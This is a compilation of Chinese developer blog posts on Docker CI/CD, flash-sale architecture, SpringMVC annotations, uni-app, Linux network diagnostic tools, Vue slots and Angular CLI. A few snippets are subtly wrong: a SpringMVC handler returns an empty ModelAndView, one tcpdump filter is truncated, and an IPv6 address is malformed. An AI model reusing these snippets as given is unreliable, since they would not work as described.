alpine: 另一个常用的基础镜像，带包管理功能，方便下载其它依赖的包

镜像瘦身最终效果
好了，看看最终构建的应用的效果：

构建的镜像大小为: 16.4MB
CI/CD
基于gitlab的runner来进行CI/CD，看看我的.gitlab-ci.yml配置：
before_script:
- if [[ $(whereis docker-compose | wc -l) -eq 0 ]]; then curl -L "https://github.com/docker/compose/releases/download/1.23.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose && chmod +x /usr/local/bin/docker-compose; fi

# ******************************************************************************************************
# ************************************** 测试环境配置 ****************************************************
# ******************************************************************************************************

deploy-test-tour:
  stage: deploy
  tags:
    - build
  only:
    - release/v2.0
  script:
    - export PRODUCTION=false
    - docker-compose stop
    - docker-compose up -d --build


# ******************************************************************************************************
# ************************************** 生产环境配置 ****************************************************
# ******************************************************************************************************

deploy-prod-tour:
  stage: deploy
  tags:
    - release
  only:
    - master
  script:
    - export PRODUCTION=true
    - docker-compose stop
    - docker-compose up -d --build
我使用docker-compose来进行容器控制，所以在before_script过程里面增加了这一步，方便新机器的全自动化嘛。
我这个项目做了点儿工程化，所以稍微正规点儿，分出了两个环境，测试和生产环境。分别绑定到不同的分支上。
正主就是下面执行的这三行：
export PRODUCTION=false
docker-compose stop
docker-compose up -d --build

export控制一下临时环境变量，方便发布不同的环境。
docker-compose stop停止旧的容器
docker-compose up -d --build编排新的容器并启动，会使用之前的缓存分层镜像，所以除了第一次构建，后面的速度都是杠杠的。

看实际的发布截图:

首次执行，总共：1 minute 22 seconds

使用缓存构建，总共：33 seconds

********************************************************************************************************************************************************************************************************
泥瓦匠：秒杀架构设计实践思路（一）
摘要: 原创出处 https://www.bysocket.com 「公众号：泥瓦匠BYSocket 」欢迎关注和转载，保留摘要，谢谢！
本文内容- 秒杀业务难点- 秒杀架构理论- 业务设计 & 总结

摘录：生命轮回。事业、家庭乃至做的每件事都会有生命周期。与其想着何时 Ending，不如脚踏实地，思考未来，活在当下。
From 小弟泥瓦匠思考录


一、前言
一提到秒杀，都会想到高性能、高并发、高可用、大流量...。在电商体系中，交易系统占据了环节中的半壁江山。比如里面特别迷人的秒杀系统，那秒杀涉及到什么架构设计？会涉及到什么业务？
泥瓦匠自言自语：秒杀这个东西，一篇文章也说不完。我这一篇起个头，实践系列还在后面，敬请期待。
二、秒杀业务难点
秒杀业务难点，总结为两点- 并发多读- 并发少写
这不同于一些场景，优惠营销系统，只会是一个用户读多个数据，但也会大流量的读操作。但没有啥写操作。
并发多读，多用户并发读一个数据。比如华为手机只有一个库存，活动秒杀。那可能几千万的人一起抢这个库存数据。还不包含很多肉机在狂刷。很多用户都在读一个商品 + 这个商品库存的数据。
并发少写，少用户并发写一个数据。比如一起抢，如何限流，因为只有少量写请求操作数据层？只有一个人才能抢到，如何解决超卖问题？
例如，12306 抢票，抢红包啥，瞬间流量更大。那这种系统更加难设计
三、秒杀架构理论
想起了架构一些定律：墨菲定律、康威定律等。任何的设计实践肯定来自某些理论和定律。
秒杀的一些架构理论（我认为的）：- 高并发原则- 高可用原则- 一致性设计
a、高并发原则
1、服务化
服务化老生常谈，选型也有 Spring Cloud 、阿里开源的 Dubbo 等一整套服务化解决方案。考虑服务隔离、限流、超时、重试、补偿等
2、缓存
层层考虑。常见的考虑三层：用户层、应用层、数据层等。
用户层：DNS 缓存、APP 缓存（图片等）应用层：静态化页面、MQ、Redis 等数据层：NoSQL、MySQL 自带 Query Cache

思考：缓存不是万能的，肯定是优化各种请求数据、请求节点、请求依赖等
3、拆分
分久必合、合久必分。各种拆分：

系统维度：根据业务模块。如电商系统中的交易系统、商品系统等
功能维度：根据功能模块。如交易系统中的下单系统、退款系统等
读写维度：根据读写比例。如商品系统中的商品写服务和商品读服务等
模块维度：根据代码特征。如分库分表、项目 moudle、代码分三层架构等


思考：就想 MyCat 等分库分表组件，天然支持了读写分离...

4、并发化
串行换并行。具体实践，具体场景分析然后优化。
b、高可用原则
1、降级
用于服务依赖隔离、fallback降级，防止雪崩效应。具体选型：hystrix 等
另外，可以做配置化，开关服务降级。核心功能保证，次功能优化为异步或屏蔽。例如：双十一的时候，会关闭某些评价等功能。
2、限流
防止请求攻击或者超出系统峰值。具体可以参考一些限流算法 Guava 的 RateLimiter。还写具体手段：恶意流量访问到 Cache 等

3、可回滚
发布版本失败或者有线上问题故障，第一时间会退到上一个稳定版本。思考：那一般运维团队，会有整套的灰度发布、回滚机制。
四、业务设计 & 总结
秒杀业务涉及也得考虑以下几点（重要的）：

幂等
防重
数据一致性
数据动静分离
请求削峰
备份


这篇思路整理，起个头。也就是大致几个方向：

请求数据尽量少，网络 IO 越少越好。包括请求数据 + 返回数据；压缩；数据服务 RT 越少越好，数据连接次数。
访问路径尽量越短，节点越少，消耗越少
避免单点故障，要有备份



资料： 开涛《亿量级流量网站架构设计》
 （关注微信公众号，领取 Java 精选干货学习资料）
********************************************************************************************************************************************************************************************************
《SpringMVC从入门到放肆》八、SpringMVC注解式开发（基本配置）
上一篇我们结束了配置式开发，配置式开发目前在企业中用的并不是很多，大部分企业都在使用注解式开发，所以今天我们就来学习注解式开发。所谓SpringMVC注解式开发是指，处理器是基于注解的类的开发方式。对于每一个定义的处理器，无需在配置文件中逐个注册，只需在代码中通过对类与方法的注解，便可完成注册。
 
一、注册组件扫描器
这里说的组件即处理器，需要指定处理器所在的基本包。

<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:context="http://www.springframework.org/schema/context"
    xmlns:aop="http://www.springframework.org/schema/aop"
    xmlns:tx="http://www.springframework.org/schema/tx"
    xmlns:mvc="http://www.springframework.org/schema/mvc"
    xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/context
        http://www.springframework.org/schema/context/spring-context.xsd
        http://www.springframework.org/schema/aop
        http://www.springframework.org/schema/aop/spring-aop.xsd
        http://www.springframework.org/schema/tx
        http://www.springframework.org/schema/tx/spring-tx.xsd
        http://www.springframework.org/schema/mvc
        http://www.springframework.org/schema/mvc/spring-mvc.xsd">
    
    <!-- 注册组件扫描器 -->
    <context:component-scan base-package="cn.wechatbao.controller"></context:component-scan>
    
</beans>

 
二、第一个注解式Demo
1：Controller

package cn.wechatbao.controller;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.servlet.ModelAndView;

@Controller
public class MyController {

    @RequestMapping("/my.do")
    public ModelAndView first(HttpServletRequest request,
            HttpServletResponse response) throws Exception {
        ModelAndView mv = new ModelAndView();
        mv.addObject("message", "第一个注解式开发程序");
        mv.setViewName("/WEB-INF/jsp/welcome.jsp");
        return new ModelAndView("");
    }

}

 
2：JSP页面（welcome.jsp）

<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
  <head>
    <title>SpringMVC1</title>
  </head>
  
  <body>
    ${message }
  </body>
</html>

 
3：完整的项目结构
 
 
三、命名空间的配置
一般情况下，我们开发时，一个Controller类就是一个模块，而里面的所有处理器方法就是该模块的不同业务功能。这个时候，我们Controller与Controller之间就要用路径来区分开来。以表示不同的业务模块。这个时候，只需要在类上再加上@RequestMapping("/test")注解就OK了。
完整的类如下：

package cn.wechatbao.controller;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.servlet.ModelAndView;

@Controller
@RequestMapping("/test")
public class MyController {

    @RequestMapping("/first.do")
    public ModelAndView first(HttpServletRequest request,
            HttpServletResponse response) throws Exception {
        ModelAndView mv = new ModelAndView();
        mv.addObject("message", "第一个注解式开发程序方法一");
        mv.setViewName("/WEB-INF/jsp/welcome.jsp");
        return mv;
    }
    
    @RequestMapping("/second.do")
    public ModelAndView second(HttpServletRequest request,
            HttpServletResponse response) throws Exception {
        ModelAndView mv = new ModelAndView();
        mv.addObject("message", "第一个注解式开发程序方法二");
        mv.setViewName("/WEB-INF/jsp/welcome.jsp");
        return mv;
    }

}

 
四、请求中通配符的使用
在实际开发的过程中，我们可能会遇到请求中的方法开头或结尾是固定的，其它字符是可变的，比如：
http://localhost:8080/SpringMVC/usermanager/user-add.do
http://localhost:8080/SpringMVC/usermanager/user-edit.do
假设上面URL中usermanager是模块名（也就是我们说的命名空间），user-add.do和user-edit.do是具体的请求。但是添加和修改我们完全可以用一个处理器方法来解决。这个时候用通配符就简单多了。其实配置起来也特别简单，只需要在处理器方法上面的注解里加*就可以了。如下

@RequestMapping("/user-*.do")
public ModelAndView userAddOrUpdate(HttpServletRequest request,
        HttpServletResponse response) throws Exception {
    ModelAndView mv = new ModelAndView();
    mv.addObject("message", "用户的添加或修改功能");
    mv.setViewName("/WEB-INF/jsp/welcome.jsp");
    return mv;
}



 
********************************************************************************************************************************************************************************************************
基于Vue.js的uni-app前端框架结合.net core开发跨平台project
一、由来

 最近由于业务需要要开发一套公益的APP项目，因此结合所给出的需求最终采用uni-app这种跨平台前端框架以及.netcore快速搭建我们的项目，并且能做到一套代码跨多个平台。
当然在前期技术框架选型方面尤其是前端，我们也是历经了许多波折，让我一 一道来：一开始我们接到app项目时，由于公司人手不足，无法开发原生的app，因此需要另辟途径，
在我的脑海中我知道微软Xamarin工具可以实现一端多平台的开发，所以我就投入进去进行深入的研究，在搭建的过程中发现Xamarin的开发环境以及调试等出现各种各样的问题，而且网上的文档比较少，导致我越深入研究越没有信心，
最终放弃了xamarin，这个工具真的不是很好用，可能是我还不了解吧。由于放弃了此工具，我就在想是否可以做一套H5然后套个壳，因此顺着这个思路我发现了一个新兴的框架uni-app，而且还是基于vue的，这个大大帮助我们，而且
对于vue，楼主我之前只花了1周的时间来学习就基本掌握其中的要领，基本可以适应uni-app，话不多说赶紧入手，越研究越有趣，一套代码可以发布H5、小程序、APP(包含安卓和IOS)，简直是福音呀。因此立马建立好前后端的项目底层框架，就开始干了。
最终也是花了两周的时间把项目搞定并且推出了H5、小程序和安卓版的，并且在项目验收时得到了一致好评，也为楼主我晋升加薪开辟了道路，哈哈哈。
当然此处还是要给出注意事项：uni-app 目前成熟度不够高，只适应一些中小项目，对于大型项目还需谨慎，当然也希望uni-app发展的越来越好。
那么话不多说什么叫做uni-app前端框架呢？让我一 一道来。
二、介绍

1、vue.js
官方文档：https://cn.vuejs.org/v2/guide/
我们知道目前市面上最流行的前端框架有angular、react、vue，对于初学者来说vue是上手比较容易的，当然如果想比较这三者的优势，可以自行上网search一下。
如：React、Angular、Vue.js:三者完整的比较指南等。
Vue.js是一套用户构建用户界面的渐进式框架，只关注视图层，还方便与第三方库或项目整合。
针对与vue的安装我们需要先安装一下node.js并且里面也有npm包管理工具，然后我们在把npm镜像替换成国内的路径，如淘宝的npm。速度非常的块。
2、uni-app 
是一个使用vue.js开发跨平台应用的前端框架，开发者编写一套代码，既可以编译成IOS、Android、H5、小程序等多个平台，是不是难以置信，好吧，我们应该相信。
官方文档：https://uniapp.dcloud.io/
unia-pp 在跨端数量、扩展能力、性能体验、周边生态、学习成本、开发成本等6大关键指标上拥有极强的竞争优势。

 
三、整体项目

1、项目采用前后端分离
前端采用uni-app，后端采用 .net core2.2 的asp.net core webapi。并且加入了jwt令牌。
2、前端
前端采用的开发工具为HBuild，后端采用的是VS2017。
前端整体页面操作动图，数据全是测试，只展示开发时的部分功能。

 
3、后端服务器由于用户没有liunx服务器，因此就存放在windows2008R2 IIS上。效果还是不错的。
 
四、总结

 有兴趣的同学可以好好研究一下。当然如果想和我交流欢迎。
 
asp.net core 交流群：787464275 欢迎加群交流如果您认为这篇文章还不错或者有所收获，您可以点击右下角的【推荐】按钮精神支持，因为这种支持是我继续写作，分享的最大动力！

作者：LouieGuo
声明：原创博客请在转载时保留原文链接或者在文章开头加上本人博客地址，如发现错误，欢迎批评指正。凡是转载于本人的文章，不能设置打赏功能，如有特殊需求请与本人联系！

微信公众号：欢迎关注                                                 QQ技术交流群： 欢迎加群
                








********************************************************************************************************************************************************************************************************
一文掌握 Linux 性能分析之网络篇

本文首发于我的公众号 CloudDeveloper(ID: cloud_dev)，专注于干货分享，号内有大量书籍和视频资源，后台回复「1024」即可领取，欢迎大家关注，二维码文末可以扫。

这是 Linux 性能分析系列的第四篇，前三篇在这里：
一文掌握 Linux 性能分析之 CPU 篇
一文掌握 Linux 性能分析之内存篇
一文掌握 Linux 性能分析之 I/O 篇
比较宽泛地讲，网络方向的性能分析既包括主机测的网络配置查看、监控，又包括网络链路上的包转发时延、吞吐量、带宽等指标分析。包括但不限于以下分析工具：

ping：测试网络连通性
ifconfig：接口配置
ip：网络接口统计信息
netsat：多种网络栈和接口统计信息
ifstat：接口网络流量监控工具
netcat：快速构建网络连接
tcpdump：抓包工具
sar：统计信息历史
traceroute：测试网络路由
pathchar：确定网络路径特征
dtrace：TCP/IP 栈跟踪
iperf / netperf / netserver：网络性能测试工具
perf 性能分析神器

本文先来看前面 7 个。
ping
ping 发送 ICMP echo 数据包来探测网络的连通性，除了能直观地看出网络的连通状况外，还能获得本次连接的往返时间（RTT 时间），丢包情况，以及访问的域名所对应的 IP 地址（使用 DNS 域名解析），比如：

我们 ping baidu.com，-c 参数指定发包数。可以看到，解析到了 baidu 的一台服务器 IP 地址为 220.181.112.244。RTT 时间的最小、平均、最大和算术平均差分别是 40.732ms、40.762ms、40.791ms 和 0.248。
ifconfig
ifconfig 命令被用于配置和显示 Linux 内核中网络接口的统计信息。通过这些统计信息，我们也能够进行一定的网络性能调优。

1）ifconfig 显示网络接口配置信息
其中，RX/TX packets 是对接收/发送数据包的情况统计，包括错误的包，丢掉多少包等。RX/TX bytes 是接收/发送数据字节数统计。其余还有很多参数，就不一一述说了，性能调优时可以重点关注 MTU（最大传输单元） 和 txqueuelen（发送队列长度），比如可以用下面的命令来对这两个参数进行微调：
ifconfig eth0 txqueuelen 2000
ifconfig eth0 mtu 1500 
2）网络接口地址配置
ifconfig 还常用来配置网口的地址，比如：
为网卡配置和删除IPv6地址：
ifconfig eth0 add 33ffe:3240:800:1005::2/64    #为网卡eth0配置IPv6地址
ifconfig eth0 del 33ffe:3240:800:1005::2/64    #为网卡eth0删除IPv6地址
修改MAC地址：
ifconfig eth0 hw ether 00:AA:BB:CC:dd:EE
配置IP地址：
ifconfig eth0 192.168.2.10
ifconfig eth0 192.168.2.10 netmask 255.255.255.0
ifconfig eth0 192.168.2.10 netmask 255.255.255.0 broadcast 192.168.2.255
IP
ip 命令用来显示或设置 Linux 主机的网络接口、路由、网络设备、策略路由和隧道等信息，是 Linux 下功能强大的网络配置工具，旨在替代 ifconfig 命令，如下显示 IP 命令的强大之处，功能涵盖到 ifconfig、netstat、route 三个命令。

netstat
netstat 可以查看整个 Linux 系统关于网络的情况，是一个集多钟网络工具于一身的组合工具。
常用的选项包括以下几个：

默认：列出连接的套接字
-a：列出所有套接字的信息
-s：各种网络协议栈统计信息
-i：网络接口信息
-r：列出路由表
-l：仅列出有在 Listen 的服务状态
-p：显示 PID 和进程名称

各参数组合使用实例如下：

netstat -at 列出所有 TCP 端口
netstat -au 列出所有 UDP 端口
netstat -lt 列出所有监听 TCP 端口的 socket
netstat -lu 列出所有监听 UDP 端口的 socket
netstat -lx 列出所有监听 UNIX 端口的 socket
netstat -ap | grep ssh 找出程序运行的端口
netstat -an | grep ':80' 找出运行在指定端口的进程

1）netstat 默认显示连接的套接字数据

整体上来看，输出结果包括两个部分：

Active Internet connections ：有源 TCP 连接，其中 Recv-Q 和 Send-Q 指的是接收队列和发送队列，这些数字一般都是 0，如果不是，说明请求包和回包正在队列中堆积。
Active UNIX domain sockets：有源 UNIX 域套接口，其中 proto 显示连接使用的协议，RefCnt 表示连接到本套接口上的进程号，Types 是套接口的类型，State 是套接口当前的状态，Path 是连接到套接口的进程使用的路径名。

2）netstat -i 显示网络接口信息

接口信息包括网络接口名称（Iface）、MTU，以及一系列接收（RX-）和传输（TX-）的指标。其中 OK 表示传输成功的包，ERR 是错误包，DRP 是丢包，OVR 是超限包。
这些参数有助于我们对网络收包情况进行分析，从而判断瓶颈所在。
3）netstat -s 显示所有网络协议栈的信息

可以看到，这条命令能够显示每个协议详细的信息，这有助于我们针对协议栈进行更细粒度的分析。
4）netstat -r 显示路由表信息

这条命令能够看到主机路由表的一个情况。当然查路由我们也可以用 ip route 和 route 命令，这个命令显示的信息会更详细一些。
ifstat
ifstat 主要用来监测主机网口的网络流量，常用的选项包括：

-a：监测主机所有网口
-i：指定要监测的网口
-t：在每行输出信息前加上时间戳
-b：以 Kbit/s 显示流量数据，而不是默认的 KB/s
-delay：采样间隔（单位是 s），即每隔 delay 的时间输出一次统计信息
-count：采样次数，即共输出 count 次统计信息

比如，通过以下命令统计主机所有网口某一段时间内的流量数据：

可以看出，分别统计了三个网口的流量数据，前面输出的时间戳，有助于我们统计一段时间内各网口总的输入、输出流量。
netcat
netcat，简称 nc，命令简单，但功能强大，在排查网络故障时非常有用，因此它也在众多网络工具中有着“瑞士军刀”的美誉。
它主要被用来构建网络连接。可以以客户端和服务端的方式运行，当以服务端方式运行时，它负责监听某个端口并接受客户端的连接，因此可以用它来调试客户端程序；当以客户端方式运行时，它负责向服务端发起连接并收发数据，因此也可以用它来调试服务端程序，此时它有点像 Telnet 程序。
常用的选项包括以下几种：

-l：以服务端的方式运行，监听指定的端口。默认是以客户端的方式运行。
-k：重复接受并处理某个端口上的所有连接，必须与 -l 一起使用。
-n：使用 IP 地址表示主机，而不是主机名，使用数字表示端口号，而不是服务名称。
-p：当以客户端运行时，指定端口号。
-s：设置本地主机发出的数据包的 IP 地址。
-C：将 CR 和 LF 两个字符作为结束符。
-U：使用 UNIX 本地域套接字通信。
-u：使用 UDP 协议通信，默认使用的是 TCP 协议。
-w：如果 nc 客户端在指定的时间内未检测到任何输入，则退出。
-X：当 nc 客户端与代理服务器通信时，该选项指定它们之间的通信协议，目前支持的代理协议包括 “4”（SOCKS v.4），“5”（SOCKS v.5）和 “connect” （HTTPs Proxy），默认使用 SOCKS v.5。
-x：指定目标代理服务器的 IP 地址和端口号。

下面举一个简单的例子，使用 nc 命令发送消息：
首先，启动服务端，用 nc -l 0.0.0.0 12345 监听端口 12345 上的所有连接。

然后，启动客户端，用 nc -p 1234 127.0.0.1 12345 使用 1234 端口连接服务器 127.0.0.1::12345。

接着就可以在两端互发数据了。这里只是抛砖引玉，更多例子大家可以多实践。
tcpdump
最后是 tcpdump，强大的网络抓包工具。虽然有 wireshark 这样更易使用的图形化抓包工具，但 tcpdump 仍然是网络排错的必备利器。
tcpdump 选项很多，我就不一一列举了，大家可以看文章末尾的引用来进一步了解。这里列举几种 tcpdump 常用的用法。
1）捕获某主机的数据包
比如想要捕获主机 200.200.200.100 上所有收到和发出的所有数据包，使用：
tcpdump host 200.200.200.100
2）捕获多个主机的数据包
比如要捕获主机 200.200.200.1 和主机 200.200.200.2 或 200.200.200.3 的通信，使用：
tcpdump host 200.200.200.1 and \(200.200.200.2 or \)
同样要捕获主机 200.200.200.1 除了和主机 200.200.200.2 之外所有主机通信的 IP 包。使用：
tcpdump ip host 200.200.200.1 and ! 200.200.200.2
3）捕获某主机接收或发出的某种协议类型的包
比如要捕获主机 200.200.200.1 接收或发出的 Telnet 包，使用：
tcpdump tcp port 23 host 200.200.200.1
4）捕获某端口相关的数据包
比如捕获在端口 6666 上通过的包，使用：
tcpdump port 6666
5）捕获某网口的数据包
比如捕获在网口 eth0 上通过的包，使用：
tcpdump -i eth0
下面还是举个例子，抓取 TCP 三次握手的包：（具体抓包的过程请移步到我的公众号进一步了解，那里阅读体验好一点，谢谢。）
总结：
本文总结了几种初级的网络工具，基本的网络性能分析，通过组合以上几种工具，基本都能应付，但对于复杂的问题，以上工具可能就无能为力了。更多高阶的工具将在下文送上，敬请期待。
参考：
基础 http://kuring.me/post/linux_net_tools/
讲 ip 和 ifconfig 很强大的一篇文章：
https://blog.csdn.net/freeking101/article/details/68939059
https://www.alibabacloud.com/help/zh/faq-detail/55757.htm
性能之巅：Linux网络性能分析工具http://www.infoq.com/cn/articles/linux-networking-performance-analytics
抓包工具tcpdump用法说明 https://www.cnblogs.com/f-ck-need-u/p/7064286.html
https://www.shiyanlou.com/courses/92
http://linuxtools-rst.readthedocs.io/zh_CN/latest/index.html
https://www.shiyanlou.com/courses/92/labs/972/document


我的公众号 CloudDeveloper(ID: cloud_dev)，号内有大量书籍和视频资源，后台回复「1024」即可领取，分享的内容包括但不限于云计算虚拟化、容器、OpenStack、K8S、雾计算、网络、工具、SDN、OVS、DPDK、Linux、Go、Python、C/C++编程技术等内容，欢迎大家关注。



********************************************************************************************************************************************************************************************************
vue---slot，slot-scoped，以及2.6版本之后插槽的用法
slot 插槽 ，是用在组件中，向组件分发内容。它的内容可以包含任何模板代码，包括HTML。
vue 在 2.6.0 中，具名插槽和作用域插槽引入了一个新的统一的语法 (即 v-slot 指令)。它取代了 slot 和 slot-scope 这两个目前已被废弃但未被移除且仍有用的特性。但是将会在vue 3 中，被废弃的这两个，不会被支持即无效。
在 2.6.0之前，插槽的用法：
1. 匿名插槽。
以 .vue 这种单文件模块为例

//创建 testSlot.vue组件
<template>
    <div>　　　　　//slot里面也可以设置内容，这个可以设置不传内容时，slot有个默认值替换
        <slot>这里面是slot的默认值</slot>
        <h3>子组件页面</h3>
    </div>
</template>

<script>
    export default {
        props:[],
        data:function(){
            return {}
        }
    }
</script>

<style>
</style>


//引用testSlot组件
<template>
    <div>
        <h1>引用testSlot组件的页面</h1>
        <testSlot>
            {{msg}}
        </testSlot>
    </div>
</template>

<script>
    import testSlot from '../components/testSlot'
    
    export default{
        data () {
            return {　　　　　　　　　msg:'这是动态传入的slot的内容'　　　　　　　}            
        },
        components:{ testSlot }
    }
</script>

<style>
</style>

 结果：

注意事项：
1） 匿名的方式，就是指把在引用组件的时候，里面传的内容，全部一起传送到组件页面中 <slot></slot> 所在的位置。
2） 只要组件中有 <slot></slot> ，并且不管有多少个，都会全部渲染为传过来的内容。
3） <slot></slot>里面也可以设置内容，这个内容是保证引入组件的时候，有个默认值。当然，<slot></slot>里面不设置内容也可以，这样只是没有默认值，是不会报错的。
4） 传递的内容，也可以是动态的，如同上面一样。但是要注意的是，这个内容不能是 引用组件的时候组件上的内容，要注意作用域。可以查看官网 插槽编译作用域。
5） 如果传递的内容，没有slot 来接收，那么，传递的内容就会被抛弃掉，不会起作用。
5） 那这个时候，如果我想某个 <slot></slot> 传指定的 内容呢？那这个时候就需要具名插槽了。
 
 2. 具名插槽，就是给插槽指定名称，然后 一 一对应

//引入组件的页面
<testSlot>
     <template slot='header'>
        <p>------------header----------------</p>
        <h3>这是header1的内容</h3>
        <p>这是header2的内容</p>
    </template>
    
    <template slot='footer'>
        <p>------------footer----------------</p>
        <h3>这是footer1的内容</h3>
        <p>这是footer2的内容</p>
    </template>
        
    <p>-----------default-----------------</p>
    <p>这是default剩下的内容1</p>
    <p>这是default剩下的内容2</p>
</testSlot>


//组件当前页面
<slot>---默认内容---</slot>
<h3>slot组件页面</h3>
<slot name='header'>---header的默认内容---</slot>
<slot name='footer'>---footer的默认内容---</slot>

结果：

注意事项：
1） 引入组件的页面，如果是多个内容，需要用template 包裹起来，并且添加 slot 属性和 自定义值 。
2） slot 的值  需要和 组件中 <slot  name='xxx'></slot>  name的值相对应。
3） 如果剩下的内容没有包裹起来并制定值的话，那么这些内容会被渲染到 组件中 所有的  <slot></slot> 所在的位置。
4） 如果 slot 设置为default 和 name 设置为default，那就和没设置slot与name是一样的。
5） 和vue 2.6.0 以后的具名插槽相比 template上的 slot='xxx' 只需要 改成 v-slot : xxx 就行了，等号改成了冒号，并且值没有引号，带引号反而会报错。
6） 具名插槽只需要  name值 与  slot的值  对应 ，插槽的顺序是没有关系的。
 
3. slot-scope 作用域插槽。
这个的作用，主要就是当向组件发送的内容需要和组件的props属性的内容有联系时，才使用这个作用域插槽。简单点来说就是：可以使用 子组件的数据 和 父组件传过来的props的值。

//引入组件的页面
<template>
    <div>
        <!--这里向组件传入props-->
        <slotScope :message='msg'>
            <!--这里的thing是随便取的名称，不与任何地方对应-->
            <div slot='sayWhat' slot-scope='thing'>说了：{{thing.said}}</div>
            <!--这里的val也是随便取的名称，不与任何地方对应-->
            <template slot='listbox' slot-scope='val'>
                <p>{{val.send.text}}</p>
            </template>
        </slotScope>
    </div>
</template>

<script>
    import slotScope from '../components/slotScope'
    
    export default{
        data () {
            return {
               msg: '这是动态传入的slot的内容',
           }
        },
        components:{slotScope }
    }
</script>

<style>
</style>


//组件页面
<template>
    <div>
        <!--这里最重要的是 :send=value，send也是可以随便取的，表示要传过去的值-->
        <slot name='listbox' v-for='value in list' :send='value'></slot>
        <!--这里最重要的是 :said='message'，said也是可以随便取的，表示要传过去的值-->
        <slot name='sayWhat' :said='message'></slot>
        
        <ul>
            <li v-for='item in list' :key='item.id'>{{item.text}}</li>
        </ul>
    </div>
</template>

<script>
    export default {
        props:['message'],
        data:function(){
            return {
              list:[{
              "id":10,
              "text":"苹果"
          },{
              "id":20,
              "text":"香蕉"
          },{
              "id":30,
              "text":"梨"
          },{
              "id":40,
              "text":"芒果"
          }]
          }
        }
    }
</script>

<style>
</style>

 结果：

注意事项：
1） 作用域插槽主要是  使用子组件的任何数据  来达到自定义显示内容的目的
2） 作用域插槽最最最最最重要的一步，即是在<slot></slot> 上绑定数据 ，如果没有绑定数据，则父组件收到的，只是一个空对象{ }。
3） 作用域插槽中 <slot></slot> 上绑定数据，可以是写死的，也可以是动态绑定的。如果是动态绑定的，则也需要 v-bind:xxx
4） 作用域插槽中 <slot></slot> 上绑定的数据 也可以传一个定义好的有返回值的 mthods 方法。比如我定义了 <slot  what='say()'></slot> ，然后say方法为： say:function(){  return  '我说了' } 。最后得到的结果就是  "我说了"，当然，动态绑定一定要加 v-bind:xxx。
5） 当 <slot></slot> 绑定上数据之后，引用组件的地方 中  发送的内容就能通过 slot-scope 来获取。获取到的内容，就是一个对象，比如 <slot name='sayWhat' said='message'></slot>   我这里绑定  said='message' 之后， 那边接收到的就是 { said:"xxxx"} 一个对象。
6） slot-scope 可以接收任何有效的可以出现在函数定义的参数位置上的 JavaScript 表达式。
 
vue 2.6.0之后   v-slot  只能用在 组件component 或者 template 上 ，用在 div 或 p 这种标签上是会报错的
1. 具名插槽的变化

<testSlot>
    <!--2.6.0以前的写法-->
    <template  slot='header'>
        <p>------------header----------------</p>
        <h3>这是header1的内容</h3>
        <p>这是header2的内容</p>
    </template>
    <!--2.6.0之后的写法-->
    <template v-slot:header>
        <p>------------header----------------</p>
        <h3>这是header1的内容</h3>
        <p>这是header2的内容</p>
    </template>
</testSlot> 

1） slot=' xxx '  改成了  v-slot : xxx  并且冒号后面这个名称不能打引号
2） 组件页面中slot的内容没有变化
3） 2.6.0 之后  具名插槽 v-slot:header  可以缩写为 #header  ，必须是有参数才能这样写！！！ # = "xxx "  这样是不行的   #default = 'xxx' 这样才可以
 
2. 作用域插槽的变化

<slotScope :message='msg'>
    <!--2.6.0之前的写法-->
    <div slot='sayWhat' slot-scope='thing'>说了：{{thing.said}}</div>
    
    <template slot='listbox' slot-scope='value'>
        <p>{{value.send.text}}</p>
    </template>

    <!--2.6.0之前的写法，不能单独用在html标签上-->
    <template v-slot:sayWhat='thing'>
    　　<div>说了：{{thing.said}}</div>
    </template>
    <template v-slot:listbox='value'>
        <p>{{value.send.text}}</p>
    </template>
</slotScope>

1） 两个属性合并成了一个  v-slot : 插槽名称 = ' 传过来的值 ' 。
2） 组件页面中slot的内容没有变化 。
3） v-slot 不能用在 html 标签上 。
4） 如果是默认插槽 可以写成  v-slot='xxx'。
5） 还增加了  可以解构插槽props 和 设置默认值的内容，具体的可以查看官网 解构插槽
 
3. 新增的还有 动态插槽名
什么是动态插槽名？大致就是动态指令参数也可以用在v-slot上，这个就要涉及到2.6.0新增的  动态参数

<template v-slot:[attrContent]='msg'>
    xxx
</template>

这个 attrContent  会被作为一个 JavaScript 表达式进行动态求值，求得的值将会作为最终的参数来使用。 比如这里attrContent 最终的值为 default  则渲染出来的结果 就是 v-slot:default='msg' 。
注意：
1） 单独在 [ ] 方括号中也可以使用表达式，但是不能存在引号和空格
2） 当然 这个动态的值  可以通过 方法，计算属性，或者 data数据 里面的内容。重要的是这个动态的值 是 引用组件的 作用域。简单点说就是父级组件的作用域。
例如，上面 v-slot:sayWhat='thing'  可以写成：
1） v-slot:[first+sec]='thing'    注意 加号两边不能留空格
2） v-slot:[attr]='thing'
3） v-slot:[attrs]='thing'
4） v-slot:[getattr()]='thing'

export default{
    data () {
        return {
            msg: '这是动态传入的slot的内容',
            attr:'sayWhat',
            first:'say',
            sec:'What',
        }
    },
    components:{ slotScope },
    computed:{
        attrs:function(){
            return 'sayWhat'
        }
    },
    methods:{
        getattr(){
            return 'sayWhat'
        }
    }
}        

 
到此，插槽的内容就介绍完毕了。^_^ Y 
********************************************************************************************************************************************************************************************************
Angular（02）-- Angular-CLI命令
声明
本系列文章内容梳理自以下来源：

Angular 官方中文版教程

官方的教程，其实已经很详细且易懂，这里再次梳理的目的在于复习和巩固相关知识点，刚开始接触学习 Angular 的还是建议以官网为主。
因为这系列文章，更多的会带有我个人的一些理解和解读，由于目前我也才刚开始接触 Angular 不久，在该阶段的一些理解并不一定是正确的，担心会有所误导，所以还是以官网为主。
正文- Angular-CLI 命令
